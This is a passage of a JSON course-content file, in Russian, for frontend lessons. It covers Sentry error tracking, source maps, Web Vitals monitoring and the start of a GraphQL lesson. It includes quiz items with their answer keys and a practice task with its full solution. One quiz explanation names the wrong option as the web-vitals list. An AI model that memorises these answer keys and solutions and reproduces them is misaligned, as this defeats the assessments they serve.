            "Тело ответа читается лишь один раз: в кеш нужно класть копию через `res.clone()`",
            "Запрос нельзя использовать как ключ: требуется строковый адрес ресурса"
          ],
          "correctIndex": 2,
          "explanation": "Тело ответа — поток, и прочитать его можно ровно один раз. Запись в кеш этот поток расходует, поэтому страница получит ответ с уже вычитанным телом и упадёт. Правильная форма — положить в кеш клон, а наружу вернуть оригинал. Проверять статус тоже стоит, чтобы не сохранить страницу ошибки, но падает код именно из-за потока."
        },
        {
          "id": "pro17-q4",
          "question": "Пользователь отправил форму в метро, где связи нет. Что даёт Background Sync?",
          "options": [
            "Запрос уйдёт немедленно через резервный канал мобильного оператора",
            "Форма сохранится в хранилище, и пользователь отправит её вручную позже",
            "Запрос будет повторён автоматически, как только браузер обнаружит соединение",
            "Страница перейдёт в офлайн-режим и заблокирует отправку любых форм"
          ],
          "correctIndex": 2,
          "explanation": "Приложение регистрирует задачу синхронизации, а операционная система будит воркер, когда связь появится, — даже если вкладка уже закрыта. Пользователь получает поведение мессенджера: сообщение помечается как отправляемое и уходит само, без необходимости помнить и повторять действие. Само тело запроса при этом обычно хранится в локальной базе."
        },
        {
          "id": "pro17-q5",
          "question": "Файл Service Worker закешировали на год вместе с остальной статикой. Чем это опасно?",
          "options": [
            "Воркер перестанет перехватывать запросы сразу после истечения срока кеширования",
            "Воркер потеряет доступ к хранилищу кеша из-за несовпадения версий скрипта",
            "Хранилище кеша переполнится, и браузер удалит все сохранённые ресурсы разом",
            "Браузер не узнает о выходе новой версии воркера, и сайт застрянет на старом коде"
          ],
          "correctIndex": 3,
          "explanation": "Воркер управляет кешем всего приложения, и обновиться он может, только если браузер скачает свежую версию своего файла. Закешировав его надолго, вы лишаете себя единственного рычага: пользователи останутся на старой логике кеширования, и выкатить исправление станет невозможно. Поэтому сам файл всегда отдают с обязательной проверкой свежести."
        }
      ]
    }
  },
  {
    "id": "pro-18",
    "moduleId": "pro",
    "level": 18,
    "title": "Мониторинг, Observability, Sentry и Web Vitals в продакшене",
    "subtitle": "3 столпа наблюдаемости (Логи, Метрики, Трейсы), Sentry Error Tracking, Source Maps, RUM, Web Vitals и Alerting",
    "description": "Освойте промышленный мониторинг фронтенд-приложений: 3 столпа Observability (Логи, Метрики, Трейсы), настройку Sentry SDK для автоматического перехвата ошибок и отслеживания производительности, загрузку Source Maps для деобфускации минифицированных стектрейсов, мониторинг Web Vitals (LCP, INP, CLS) от реальных пользователей (RUM) и настройку алертинга в Slack/PagerDuty.",
    "estimatedMinutes": 70,
    "difficulty": "advanced",
    "tags": [
      "monitoring",
      "observability",
      "sentry",
      "error-tracking",
      "source-maps",
      "web-vitals",
      "rum",
      "logging",
      "alerting",
      "pagerduty",
      "opentelemetry"
    ],
    "theory": {
      "overview": "Без промышленного мониторинга баги в продакшене обнаруживаются через жалобы пользователей — через дни или недели. К этому моменту сотни клиентов уже столкнулись с белым экраном, потерянной корзиной или некликабельной кнопкой «Оплатить».\n\n**Observability (Наблюдаемость)** — это способность системы объяснить своё внутреннее состояние по внешним сигналам. В индустрии выделяют **3 столпа наблюдаемости**: Логи (что произошло), Метрики (числовые индикаторы), Трейсы (путь запроса через систему).\n\nВ этом уроке мы разберём полный цикл: от настройки Sentry SDK до алертинга в Slack при всплеске Error Rate.",
      "sections": [
        {
          "title": "3 Столпа Observability: Логи, Метрики и Трейсы",
          "content": "Три категории данных, необходимых для диагностики инцидентов:\n\n1. **Логи (Logs) — Текстовый журнал событий**:\n- Каждая запись содержит: **timestamp** (когда), **level** (info/warn/error/fatal), **message** (что случилось), **context** (userId, sessionId, URL).\n- **Структурированные JSON-логи** вместо `console.log('error!')`: `{ timestamp: '2026-08-20T10:15:00Z', level: 'error', message: 'Cannot read property id of undefined', userId: 'u_123', page: '/cart' }`.\n- Инструменты: Sentry Breadcrumbs, Datadog Logs, ELK Stack.\n\n2. **Метрики (Metrics) — Числовые агрегированные показатели**:\n- **Web Vitals**: LCP (Largest Contentful Paint), INP (Interaction to Next Paint), CLS (Cumulative Layout Shift).\n- **Error Rate** (процент сессий с ошибками): нормальный показатель < 0.5%.\n- **Apdex Score** (удовлетворённость пользователей): 0.0–1.0 (целевой > 0.85).\n- Инструменты: Sentry Performance, Grafana, Prometheus, Google Analytics.\n\n3. **Трейсы (Traces) — Распределённая трассировка запросов**:\n- Трейс показывает путь одного HTTP-запроса через цепочку микросервисов: `Browser → API Gateway → Auth Service → Database → Response`.\n- Позволяет точно определить, **какой микросервис тормозит** (например, запрос к Redis занял 4 секунды).\n- Инструменты: OpenTelemetry, Sentry Performance, Jaeger, Datadog APM.",
          "image": {
            "src": "/images/lessons/web-monitoring-observability.svg",
            "alt": "3 Столпа Observability: Логи, Метрики и Трейсы; Sentry Error Tracking и Source Maps",
            "caption": "3 столпа наблюдаемости (Logs, Metrics, Traces), Sentry SDK с Source Maps и RUM мониторинг Web Vitals"
          },
          "codeExample": {
            "language": "typescript",
            "code": "// Структурированный логгер для фронтенд-приложения\ninterface LogEntry {\n  timestamp: string;\n  level: 'info' | 'warn' | 'error' | 'fatal';\n  message: string;\n  context?: Record<string, unknown>;\n}\n\nconst logger = {\n  _send(entry: LogEntry) {\n    // В продакшене: отправка в Sentry Breadcrumbs / Datadog\n    if (entry.level === 'error' || entry.level === 'fatal') {\n      console.error(`[${entry.level.toUpperCase()}]`, entry.message, entry.context);\n    }\n  },\n\n  info(message: string, context?: Record<string, unknown>) {\n    this._send({ timestamp: new Date().toISOString(), level: 'info', message, context });\n  },\n\n  error(message: string, context?: Record<string, unknown>) {\n    this._send({ timestamp: new Date().toISOString(), level: 'error', message, context });\n  },\n};\n\n// Использование:\nlogger.error('Ошибка загрузки каталога', {\n  userId: 'u_123',\n  page: '/catalog',\n  statusCode: 500,\n});",
            "title": "Структурированный JSON-логгер вместо console.log",
            "explanation": "Структурированные логи с timestamp, level и context позволяют мгновенно фильтровать события в Sentry и Datadog."
          }
        },
        {
          "title": "Sentry SDK: Автоматический перехват ошибок и Performance Monitoring",
          "content": "Настройка промышленного Error Tracking через Sentry:\n\n1. **Инициализация Sentry SDK**:\n- `Sentry.init({ dsn: '...', environment: 'production', release: 'v2.4.0' })`.\n- **DSN (Data Source Name)** — уникальный URL проекта в Sentry для маршрутизации ошибок.\n- Автоматически перехватывает: `window.onerror`, `unhandledrejection` (непойманные промисы), ошибки рендеринга React (через `Sentry.ErrorBoundary`).\n\n2. **Performance Monitoring (Трейсинг)**:\n- `tracesSampleRate: 0.2` — сэмплирование 20% транзакций (достаточно для аналитики без перегрузки сервера).\n- Sentry автоматически записывает: время загрузки страницы, все XHR/fetch запросы с длительностью, рендеринг React компонентов.\n\n3. **Breadcrumbs (Хлебные крошки)**:\n- Sentry автоматически записывает последние 100 действий пользователя перед ошибкой: клики, навигации, HTTP-запросы, console.log.\n- Это позволяет **воспроизвести шаги** пользователя, приведшие к сбою!",
          "codeExample": {
            "language": "typescript",
            "code": "// src/main.tsx — Инициализация Sentry в React-приложении\nimport * as Sentry from '@sentry/react';\n\nSentry.init({\n  dsn: 'https://examplePublicKey@o0.ingest.sentry.io/0',\n  environment: import.meta.env.MODE, // 'production' | 'staging'\n  release: `academy@${__APP_VERSION__}`, // Привязка к версии релиза\n  \n  // Performance: сэмплируем 20% транзакций\n  tracesSampleRate: 0.2,\n  \n  // Replay: записываем сессии пользователей с ошибками\n  replaysSessionSampleRate: 0.1, // 10% всех сессий\n  replaysOnErrorSampleRate: 1.0, // 100% сессий С ОШИБКАМИ!\n  \n  integrations: [\n    Sentry.browserTracingIntegration(),\n    Sentry.replayIntegration(),\n  ],\n  \n  // Фильтрация шума (не отправлять ошибки от сторонних скриптов)\n  beforeSend(event) {\n    if (event.exception?.values?.[0]?.stacktrace?.frames?.some(\n      f => f.filename?.includes('chrome-extension')\n    )) return null; // Игнорировать баги расширений Chrome\n    return event;\n  }\n});\n\n// Обёртка React приложения в Sentry Error Boundary\nSentry.withErrorBoundary(App, {\n  fallback: <p>Произошла ошибка. Наша команда уже получила уведомление!</p>,\n});",
            "title": "Полная настройка Sentry SDK с Performance, Replay и фильтрацией шума",
            "explanation": "Sentry перехватывает ошибки, записывает цепочку действий (breadcrumbs), сэмплирует транзакции для анализа производительности и записывает видео-реплей при сбоях."
          }
        },
        {
          "title": "Source Maps: Деобфускация минифицированных стектрейсов",
          "content": "Почему стектрейсы в продакшене нечитаемы и как это исправить:\n\n1. **Проблема минификации**:\n- В продакшене JavaScript код проходит через минификацию и обфускацию: переменные переименовываются в `a`, `b`, `c`, все файлы объединяются в один бандл `main.a1b2c3.js`.\n- Стектрейс ошибки выглядит так: `TypeError at main.a1b2c3.js:1:48273` — абсолютно бесполезно для отладки!\n\n2. **Source Maps — Карты соответствия**:\n- Файл `.map` содержит маппинг из минифицированного кода обратно в исходные файлы: `main.a1b2c3.js:1:48273 → src/components/Cart.tsx:42:addToCart()`.\n- Sentry автоматически применяет Source Maps и показывает **точный файл, строку и имя функции** в стектрейсе!\n\n3. **Безопасная загрузка Source Maps**:\n- Source Maps НИКОГДА не публикуются на CDN (это раскроет исходный код!).\n- Их загружают напрямую в Sentry через CI/CD: `sentry-cli sourcemaps upload --release v2.4.0 ./dist/assets/`.",
          "codeExample": {
            "language": "javascript",
            "code": "// .github/workflows/deploy.yml — Загрузка Source Maps в Sentry через CI/CD\n// Этот шаг выполняется ПОСЛЕ сборки, НО ПЕРЕД удалением .map файлов\n\n// Шаг 1: Сборка проекта с генерацией Source Maps\n// npm run build  (vite build --sourcemap)\n\n// Шаг 2: Загрузка Source Maps в Sentry\n// npx @sentry/cli sourcemaps upload \\\n//   --auth-token $SENTRY_AUTH_TOKEN \\\n//   --org my-org \\\n//   --project frontend-academy \\\n//   --release academy@2.4.0 \\\n//   ./dist/assets/\n\n// Шаг 3: УДАЛЕНИЕ .map файлов перед деплоем на CDN!\n// find ./dist -name '*.map' -delete\n\nconsole.log('Source Maps загружены в Sentry, .map файлы удалены из дистрибутива!');\nconsole.log('Теперь стектрейс main.a1b2c3.js:1:48273 превратится в Cart.tsx:42:addToCart()');",
            "title": "CI/CD пайплайн загрузки Source Maps в Sentry и удаления из CDN",
            "explanation": "Source Maps загружаются в Sentry через приватный токен, а затем удаляются из сборки — исходный код остаётся защищённым."
          }
        },
        {
          "title": "RUM, Web Vitals и Alerting: оповещения о деградации",
          "content": "Мониторинг реальных пользователей и автоматические оповещения:\n\n1. **RUM (Real User Monitoring)**:\n- В отличие от синтетического мониторинга (Lighthouse), RUM собирает метрики от **реальных пользователей** на реальных устройствах в реальных сетях.\n- Данные группируются по: стране, браузеру, типу устройства (десктоп/мобильный), версии приложения.\n- Позволяет обнаружить, что LCP = 1.2s для пользователей в Москве, но 4.8s для Якутска.\n\n2. **Core Web Vitals (Метрики Google)**:\n- **LCP (Largest Contentful Paint)** — время рендеринга самого крупного элемента (цель: < 2.5s).\n- **INP (Interaction to Next Paint)** — задержка реакции на взаимодействие (цель: < 200ms).\n- **CLS (Cumulative Layout Shift)** — сдвиг элементов макета (цель: < 0.1).\n\n3. **Alerting (Автоматические оповещения)**:\n- Sentry Alerts: «Если Error Rate > 1% за 5 минут → Slack уведомление #frontend-alerts».\n- PagerDuty Integration: «Если Apdex Score < 0.7 → SMS и звонок дежурному инженеру».\n- Grafana Dashboard: визуализация метрик в реальном времени.",
          "codeExample": {
            "language": "typescript",
            "code": "// Отправка Web Vitals от реальных пользователей в Sentry\nimport { onLCP, onINP, onCLS } from 'web-vitals';\nimport * as Sentry from '@sentry/react';\n\nfunction reportWebVital(metric: { name: string; value: number; id: string }) {\n  // Отправка в Sentry как custom measurement\n  Sentry.setMeasurement(metric.name, metric.value, 'millisecond');\n  \n  // Дополнительно: отправка в Google Analytics 4\n  if (typeof gtag === 'function') {\n    gtag('event', metric.name, {\n      value: Math.round(metric.name === 'CLS' ? metric.value * 1000 : metric.value),\n      event_label: metric.id,\n      non_interaction: true,\n    });\n  }\n  \n  console.log(`[Web Vital] ${metric.name}: ${metric.value.toFixed(1)}ms`);\n}\n\n// Подписка на все Core Web Vitals\nonLCP(reportWebVital);  // Largest Contentful Paint\nonINP(reportWebVital);  // Interaction to Next Paint\nonCLS(reportWebVital);  // Cumulative Layout Shift",
            "title": "Сбор Core Web Vitals (LCP, INP, CLS) от реальных пользователей",
            "explanation": "Библиотека web-vitals от Google измеряет метрики в браузере пользователя, а Sentry агрегирует их для аналитики."
          }
        }
      ],
      "seniorTips": [
        "Устанавливайте `tracesSampleRate: 0.1–0.2` (10–20% транзакций) — этого достаточно для анализа производительности, но не перегрузит квоту Sentry.",
        "НИКОГДА не публикуйте `.map` файлы на CDN — загружайте их только в Sentry через приватный CI/CD токен, затем удаляйте из сборки.",
        "Используйте `beforeSend` для фильтрации шума: игнорируйте ошибки от расширений Chrome, рекламных скриптов и ботов (User-Agent содержит 'bot').",
        "Настройте `replaysOnErrorSampleRate: 1.0` — это запишет видео-реплей КАЖДОЙ сессии с ошибкой, позволяя точно воспроизвести действия пользователя.",
        "Фиксируйте `release` при инициализации Sentry (привязка к Git-тегу) — это позволяет отслеживать, какие ошибки появились в новой версии."
      ],
      "commonMistakes": [
        {
          "bad": "// Публикация Source Maps на CDN вместе с бандлами\n// dist/assets/main.a1b2c.js.map доступен публично!",
          "good": "// Source Maps загружаются в Sentry через CI/CD, затем удаляются из dist/",
          "reason": "Публичные Source Maps позволяют конкурентам просмотреть весь исходный код приложения."
        },
        {
          "bad": "// tracesSampleRate: 1.0 — сэмплирование 100% транзакций\nSentry.init({ tracesSampleRate: 1.0 }); // ❌ Огромный расход квоты!",
          "good": "Sentry.init({ tracesSampleRate: 0.2 }); // ✅ 20% достаточно для аналитики",
          "reason": "100%-ное сэмплирование генерирует тысячи событий в минуту и быстро исчерпывает квоту Sentry."
        },
        {
          "bad": "// Использование console.log для логирования ошибок в продакшене\nconsole.log('что-то сломалось', err); // ❌ Никто этот лог не увидит!",
          "good": "Sentry.captureException(err, { tags: { page: '/cart' } });",
          "reason": "console.log виден только в DevTools конкретного пользователя. Sentry агрегирует ошибки от ВСЕХ пользователей."
        }
      ],
      "keyTakeaways": [
        "3 столпа Observability: Логи (что случилось), Метрики (числовые показатели), Трейсы (путь запроса).",
        "Sentry автоматически перехватывает window.onerror и unhandledrejection.",
        "Source Maps деобфусцируют стектрейсы, но их нельзя публиковать на CDN.",
        "RUM собирает Web Vitals (LCP, INP, CLS) от реальных пользователей на реальных устройствах.",
        "Alerting через Slack/PagerDuty уведомляет команду мгновенно при всплеске ошибок."
      ]
    },
    "sandbox": {
      "initialHtml": "<div id=\"monitoring-sandbox\">\n  <h3>Sentry Error Tracking Симулятор</h3>\n  <div style=\"display:flex; gap:8px; margin-bottom:12px; flex-wrap:wrap;\">\n    <button id=\"btn-trigger-error\" style=\"background:#f85149; color:#fff; border:none; padding:8px 14px; font-weight:bold; cursor:pointer;\">1. Trigger TypeError</button>\n    <button id=\"btn-web-vitals\" style=\"background:#2dff8a; color:#0a0e13; border:none; padding:8px 14px; font-weight:bold; cursor:pointer;\">2. Измерить Web Vitals</button>\n    <button id=\"btn-sourcemap\" style=\"background:#29e7ff; color:#0a0e13; border:none; padding:8px 14px; font-weight:bold; cursor:pointer;\">3. Деобфускация Source Map</button>\n  </div>\n  <pre id=\"sentry-log\" style=\"color:#e6edf3; font-size:11px; line-height:1.5; background:#161b22; padding:12px; border-radius:6px; white-space:pre-wrap;\"></pre>\n</div>",
      "initialCss": "#monitoring-sandbox { font-family: monospace; color: #e6edf3; padding: 16px; background: #0d1117; border-radius: 8px; }",
      "initialJs": "const log = document.getElementById('sentry-log');\n\ndocument.getElementById('btn-trigger-error').onclick = () => {\n  log.textContent = '🚨 [Sentry] Новая ошибка перехвачена!\\n';\n  log.textContent += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\\n';\n  log.textContent += 'TypeError: Cannot read properties of undefined (reading \"id\")\\n';\n  log.textContent += 'at addToCart (main.a1b2c3.js:1:48273)\\n\\n';\n  log.textContent += '📋 Breadcrumbs (последние действия пользователя):\\n';\n  log.textContent += '  10:15:01 [click] button.add-to-cart\\n';\n  log.textContent += '  10:15:00 [fetch] GET /api/product/42 → 200 OK\\n';\n  log.textContent += '  10:14:55 [navigation] /catalog → /product/42\\n';\n  log.textContent += '\\n🔔 Slack Alert: #frontend-alerts → \"Error Rate 1.2% (threshold: 1%)\"';\n  log.style.color = '#f85149';\n};\n\ndocument.getElementById('btn-web-vitals').onclick = () => {\n  log.textContent = '📊 [RUM] Core Web Vitals от реального пользователя:\\n';\n  log.textContent += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\\n';\n  log.textContent += '  LCP: 1.2s  ✅ (порог < 2.5s)\\n';\n  log.textContent += '  INP: 45ms  ✅ (порог < 200ms)\\n';\n  log.textContent += '  CLS: 0.03  ✅ (порог < 0.1)\\n\\n';\n  log.textContent += '📱 Устройство: iPhone 14, iOS 18, Safari 20\\n';\n  log.textContent += '🌍 Регион: Москва, Россия\\n';\n  log.textContent += '📶 Соединение: 4G (RTT: 50ms)\\n';\n  log.textContent += '\\n🎉 Apdex Score: 0.94 — Отличный пользовательский опыт!';\n  log.style.color = '#2dff8a';\n};\n\ndocument.getElementById('btn-sourcemap').onclick = () => {\n  log.textContent = '🗺️ [Source Map] Деобфускация стектрейса:\\n';\n  log.textContent += '━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━\\n';\n  log.textContent += '❌ До: main.a1b2c3.js:1:48273 (нечитаемо!)\\n';\n  log.textContent += '✅ После: src/components/Cart.tsx:42 → addToCart()\\n\\n';\n  log.textContent += '📁 Точный исходный код:\\n';\n  log.textContent += '  40 |   const handleAdd = (product) => {\\n';\n  log.textContent += '  41 |     const { id, title, price } = product;\\n';\n  log.textContent += '  42 >     cart.items.push({ id: product.variant.id }); // ← ОШИБКА\\n';\n  log.textContent += '  43 |   };\\n\\n';\n  log.textContent += '💡 product.variant === undefined (API не вернул поле variant)';\n  log.style.color = '#29e7ff';\n};",
      "instructions": "Практика с мониторингом:\n1. Нажмите 'Trigger TypeError' — Sentry перехватит ошибку с breadcrumbs\n2. Нажмите 'Измерить Web Vitals' — RUM покажет реальные метрики пользователя\n3. Нажмите 'Деобфускация Source Map' — стектрейс превратится в читаемый код"
    },
    "task": {
      "title": "Настройка Sentry SDK с Performance Monitoring и сбор Web Vitals",
      "scenario": "Настройте полную инициализацию Sentry для React-приложения: DSN, привязка к release, tracesSampleRate 20%, фильтрация ошибок от расширений Chrome через beforeSend, и подключение сбора Web Vitals (LCP, INP, CLS) через библиотеку web-vitals.",
      "criteria": [
        "Sentry.init содержит dsn, environment, release и tracesSampleRate: 0.2",
        "beforeSend фильтрует ошибки с 'chrome-extension' в стектрейсе",
        "Подключены интеграции browserTracingIntegration и replayIntegration",
        "Web Vitals (LCP, INP, CLS) отправляются в Sentry через Sentry.setMeasurement"
      ],
      "starterCode": {
        "js": "// Настройте Sentry SDK и сбор Web Vitals\nimport * as Sentry from '@sentry/react';\nimport { onLCP, onINP, onCLS } from 'web-vitals';\n\n// Ваш код"
      },
      "hints": [
        "Sentry.init({ dsn: '...', tracesSampleRate: 0.2, integrations: [Sentry.browserTracingIntegration()] })",
        "onLCP(metric => Sentry.setMeasurement(metric.name, metric.value, 'millisecond'))"
      ],
      "solution": {
        "js": "import * as Sentry from '@sentry/react';\nimport { onLCP, onINP, onCLS } from 'web-vitals';\n\n// 1. Инициализация Sentry SDK\nSentry.init({\n  dsn: 'https://examplePublicKey@o0.ingest.sentry.io/0',\n  environment: 'production',\n  release: 'academy@2.4.0',\n  tracesSampleRate: 0.2,\n  replaysOnErrorSampleRate: 1.0,\n  integrations: [\n    Sentry.browserTracingIntegration(),\n    Sentry.replayIntegration(),\n  ],\n  beforeSend(event) {\n    const frames = event.exception?.values?.[0]?.stacktrace?.frames || [];\n    if (frames.some(f => f.filename?.includes('chrome-extension'))) return null;\n    return event;\n  },\n});\n\n// 2. Сбор Web Vitals от реальных пользователей\nfunction reportVital(metric) {\n  Sentry.setMeasurement(metric.name, metric.value, 'millisecond');\n  console.log('[Web Vital]', metric.name, metric.value.toFixed(1));\n}\n\nonLCP(reportVital);\nonINP(reportVital);\nonCLS(reportVital);\n\nconsole.log('Sentry SDK + Web Vitals мониторинг активирован!');",
        "explanation": "Sentry перехватывает ошибки с фильтрацией шума от расширений, сэмплирует 20% транзакций и собирает Core Web Vitals от реальных пользователей."
      }
    },
    "quiz": {
      "questions": [
        {
          "id": "pro18-q1",
          "question": "Что из перечисленного составляет три столпа наблюдаемости?",
          "options": [
            "Тесты, развёртывание и мониторинг инфраструктуры",
            "Загрузка, отзывчивость и визуальная стабильность",
            "Логи, метрики и трассировки",
            "Сборка, проверка типов и статический анализ кода"
          ],
          "correctIndex": 2,
          "explanation": "Каждый столп отвечает на свой вопрос. Логи — это отдельные события с подробностями, они говорят, что именно случилось. Метрики — агрегированные числа во времени, они показывают, насколько всё плохо и когда началось. Трассировки прослеживают путь одного запроса через все сервисы и подсказывают, где именно он завис. Третий вариант перечисляет ключевые веб-метрики — это частный случай метрик."
        },
        {
          "id": "pro18-q2",
          "question": "Карты исходников выложили на CDN рядом с собранным бандлом. Чем это плохо?",
          "options": [
            "Браузер начнёт грузить их всем пользователям подряд, замедляя открытие страницы",
            "Карты вступят в конфликт с политикой безопасности содержимого страницы",
            "Система мониторинга перестанет их находить и не сумеет расшифровать стек вызовов",
            "Любой желающий сможет восстановить по ним исходный код приложения"
          ],
          "correctIndex": 3,
          "explanation": "Карта содержит полный исходный текст: комментарии, имена переменных, внутреннюю логику, иногда следы отладки. Опубликовав её, вы фактически открываете исходный код приложения. Браузер обычным пользователям её не скачивает, только при открытых инструментах разработчика, так что скорость не страдает. Правильный порядок — загружать карту в систему мониторинга по приватному токену и удалять из публикуемой сборки."
        },
        {
          "id": "pro18-q3",
          "question": "Что показывают хлебные крошки в отчёте об ошибке?",
          "options": [
            "Хронологию действий перед сбоем: переходы, нажатия, сетевые запросы",
            "Путь по разделам сайта, который отображается в навигации приложения",
            "Цепочку вызовов функций, которая привела к возникновению исключения",
            "Историю версий приложения, в которых встречалась эта же самая ошибка"
          ],
          "correctIndex": 0,
          "explanation": "Стек вызовов отвечает на вопрос «где сломалось», а эта хронология — на вопрос «что делал пользователь». Видно, на какой экран он пришёл, какие кнопки нажимал, какие запросы ушли и что они вернули. Часто именно здесь обнаруживается настоящая причина: неудачный запрос за минуту до падения, оставивший состояние в неверном виде."
        },
        {
          "id": "pro18-q4",
          "question": "Почему долю отслеживаемых транзакций производительности ставят около 10–20 процентов, а не 100?",
          "options": [
            "Полный сбор быстро исчерпывает квоту и нагружает клиента, а выборки хватает для статистики",
            "При полном сборе теряется точность: система начинает усреднять показатели по выборке",
            "При значениях выше 20 процентов отчёты перестают строиться по техническим причинам",
            "Полный сбор требует отдельного соглашения о защите персональных данных пользователей"
          ],
          "correctIndex": 0,
          "explanation": "Замер производительности — это не редкое событие вроде ошибки, а данные по каждой навигации каждого посетителя: на заметном трафике счёт идёт на миллионы записей в день. Для статистики это избыточно, ведь распределение по десятой части выборки практически совпадает с полным. Ошибки, в отличие от замеров, обычно собирают целиком — они редки и каждая важна."
        },
        {
          "id": "pro18-q5",
          "question": "Lighthouse показывает отличные результаты, а данные от реальных пользователей — плохие. Почему так бывает?",
          "options": [
            "Инструмент считает метрики по другим формулам, несовместимым с полевыми данными",
            "Инструмент измеряет один прогон на быстром канале, а люди приходят с разных устройств",
            "Данные от пользователей собираются с задержкой в месяц и отражают прошлую версию",
            "Инструмент учитывает только первую загрузку, а полевые данные — только повторные визиты"
          ],
          "correctIndex": 1,
          "explanation": "Лабораторный замер — это один прогон в управляемых условиях: конкретное устройство, стабильный канал, пустой кеш, никаких расширений. Полевые данные собираются со всех подряд: бюджетные телефоны, слабый мобильный интернет, десяток вкладок и блокировщики. Вдобавок отзывчивость в лаборатории вообще не измеряется, ведь никто ни на что не нажимает. Оба источника нужны: один ловит регрессии до релиза, другой показывает правду."
        }
      ]
    }
  },
  {
    "id": "pro-19",
    "moduleId": "pro",
    "level": 19,
    "title": "Сетевой обмен данными нового поколения: GraphQL, Apollo Client, tRPC и gRPC-web",
    "subtitle": "REST vs GraphQL, Schema & SDL, Normalized Cache (__typename:id), Optimistic UI, End-to-End Type Safety в tRPC и gRPC-web",
    "description": "Освойте современные протоколы клиент-серверного взаимодействия: сравнение REST и GraphQL, решение проблем Over-fetching и N+1, написание Queries/Mutations/Subscriptions, архитектуру нормализованного кэша Apollo Client с оптимистичными обновлениями (Optimistic UI), революционный tRPC для сквозной TypeScript-типизации без кодогенерации и бинарный gRPC-web.",
    "estimatedMinutes": 75,
    "difficulty": "advanced",
    "tags": [
      "graphql",
      "apollo-client",
      "trpc",
      "grpc-web",
      "protobuf",
      "normalized-cache",
      "optimistic-ui",
      "api-design",
      "type-safety",
      "networking"
    ],
    "theory": {
      "overview": "На протяжении десятилетий REST API был стандартом передачи данных в вебе. Однако с ростом сложности SPA-приложений и мобильных клиентов проявились его главные ограничения: избыточная загрузка ненужных полей (**Over-fetching**), каскадные цепочки запросов (**Under-fetching / N+1 проблема**) и необходимость ручной синхронизации типов между бэкендом и фронтендом.\n\nВ этом уроке мы разберём технологии сетевого взаимодействия нового поколения: декларативный язык запросов **GraphQL** с нормализованным кэшированием в **Apollo Client**, сквозную типизацию **tRPC** и высокопроизводительный бинарный **gRPC-web**.",
      "sections": [
        {
          "title": "REST против GraphQL: Over-fetching, Under-fetching и язык схем (SDL)",
          "content": "Фундаментальные различия архитектур API:\n\n1. **Проблемы традиционного REST API**:\n- **Over-fetching (Избыточная выборка)**: эндпоинт `/api/users/1` возвращает объект из 60 полей, хотя на карточке аватара нужны только `name` и `avatarUrl`. Результат: лишние мегабайты трафика на мобильных устройствах.\n- **Under-fetching / N+1 проблема (Недостаточная выборка)**: чтобы отобразить профиль с постами и комментариями, клиент вынужден делать 1 запрос к `/user/1`, затем 10 запросов к `/posts?userId=1`, и затем 30 запросов к `/comments?postId=...`.\n\n2. **Решение GraphQL (Single Endpoint + SDL)**:\n- Клиент обращается к **ЕДИНОМУ эндпоинту** (обычно `POST /graphql`) и в теле запроса строго описывает форму ответа.\n- **Schema Definition Language (SDL)**: сервер объявляет строгую типизированную схему, которая служит неизменным контрактом между командами.\n- Сервер отдает **РОВНО ТЕ ПОЛЯ**, которые запросил клиент — ни байтом больше!",
          "image": {
            "src": "/images/lessons/web-graphql-trpc.svg",
            "alt": "REST против GraphQL, Apollo Cache и сквозная типизация tRPC",
            "caption": "Архитектура GraphQL: решение проблем Over-fetching, нормализованный кэш Apollo InMemoryCache и tRPC"
          },
          "codeExample": {
            "language": "json",
            "code": "# 1. Определение схемы на сервере (Schema Definition Language — SDL)\ntype User {\n  id: ID!\n  name: String!\n  email: String!\n  avatarUrl: String\n  posts(limit: Int): [Post!]!\n}\n\ntype Post {\n  id: ID!\n  title: String!\n  likesCount: Int!\n}\n\ntype Query {\n  user(id: ID!): User\n}\n\n# 2. Клиентский запрос (Query) — запрашиваем только то, что нужно для UI:\nquery GetUserProfile($userId: ID!) {\n  user(id: $userId) {\n    name\n    avatarUrl\n    posts(limit: 3) {\n      title\n      likesCount\n    }\n  }\n}",
            "title": "Schema Definition Language (SDL) и точечный клиентский Query",
            "explanation": "Клиент получает имя, аватар и 3 последних поста в одном HTTP-запросе без лишних полей и каскадных цепочек."
          }
        },
        {
          "title": "3 Операции в GraphQL: Query, Mutation и Subscriptions",
          "content": "Как устроены операции в GraphQL:\n\n1. **Query (Чтение данных — аналог HTTP GET)**:\n- Идемпотентный запрос на получение данных. Поддерживает переменные (`$variable: Type`), директивы (`@include`, `@skip`) и фрагменты (`fragment`) для повторного использования полей в компонентах React.\n\n2. **Mutation (Изменение данных — аналог POST / PUT / DELETE)**:\n- Создание, обновление или удаление сущностей на сервере. Всегда возвращает обновленный объект, что позволяет клиенту мгновенно обновить локальный кэш без повторного GET-запроса!\n\n3. **Subscription (Реалтайм-поток через WebSockets)**:\n- Подписка на события сервера (новые сообщения чата, изменение статуса заказа). При возникновении события сервер пушит обновленные данные клиенту по постоянному соединению `graphql-ws`.",
          "codeExample": {
            "language": "typescript",
            "code": "// Клиентская мутация создания комментария с возвратом обновленного поста\nimport { gql, useMutation } from '@apollo/client';\n\nconst ADD_COMMENT_MUTATION = gql`\n  mutation AddComment($postId: ID!, $text: String!) {\n    addComment(postId: $postId, text: $text) {\n      id\n      text\n      createdAt\n      author {\n        name\n        avatarUrl\n      }\n      # Возвращаем обновленный счетчик комментариев родительского поста!\n      post {\n        id\n        commentsCount\n      }\n    }\n  }\n`;\n\nexport function useAddComment() {\n  const [addComment, { loading, error }] = useMutation(ADD_COMMENT_MUTATION);\n  return { addComment, loading, error };\n}",
            "title": "GraphQL Mutation с получением обновленного состояния",
            "explanation": "Мутация не просто отправляет данные, но сразу возвращает обновленный объект с commentsCount для авто-обновления кэша."
          }
        },
        {
          "title": "Apollo Client: Нормализованный кэш и Optimistic UI",
